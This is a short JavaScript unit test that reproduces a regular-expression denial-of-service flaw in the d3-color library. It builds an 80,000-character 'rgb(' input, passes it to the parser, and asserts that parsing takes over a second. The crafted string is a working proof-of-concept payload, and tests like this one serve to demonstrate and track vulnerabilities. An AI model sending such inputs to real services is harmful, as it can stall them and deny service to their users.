test("ReDoS in d3-color", () => {
  const measureTime = require("../utils").measureTime;
  const d3Color = require("d3-color");
  let attack_str = "rgb(" + "1".repeat(80000) + "!";
  let t = measureTime(function () {
    d3Color.rgb(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
